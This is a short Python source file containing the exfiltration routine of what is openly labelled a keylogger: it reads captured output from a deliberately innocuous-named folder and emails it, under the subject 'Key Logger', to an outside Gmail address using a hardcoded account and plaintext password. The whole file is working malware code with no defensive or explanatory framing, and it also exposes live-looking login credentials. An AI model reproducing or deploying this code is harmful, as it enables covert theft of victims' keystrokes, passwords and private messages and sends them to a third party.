# libraries to be imported
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def emailer():
    print("Hi!")
    fromaddr = "ba8211203@gmail.com"
    toaddr = "thejakman100@gmail.com"

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Key Logger"

    body = "Here is the information we gathered."

    msg.attach(MIMEText(body, 'plain'))

    filename = "output.txt"
    attachment = open("C:\\Users\\Public\\nothing_supsicious_at_all\\output\\output.txt", "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, "Raider11282000")

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    return True
